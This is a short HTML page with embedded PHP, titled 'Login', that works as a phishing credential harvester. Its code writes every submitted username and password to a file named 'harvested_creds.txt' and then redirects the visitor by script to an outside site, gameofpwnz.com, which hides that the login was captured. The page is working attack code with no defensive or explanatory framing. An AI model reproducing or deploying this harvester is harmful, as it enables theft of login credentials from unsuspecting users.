<html>
 <head>
  <title>Login</title>
 </head>
 <body>

<?php


if ($_POST['Login']){

$myFile = "harvested_creds.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_POST['username'] . ":::";
fwrite($fh, $stringData);
$stringData = $_POST['password'] . ":::\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>


//goes here after
<script>location.href='https://gameofpwnz.com';</script>
	 
 </body>
</html>
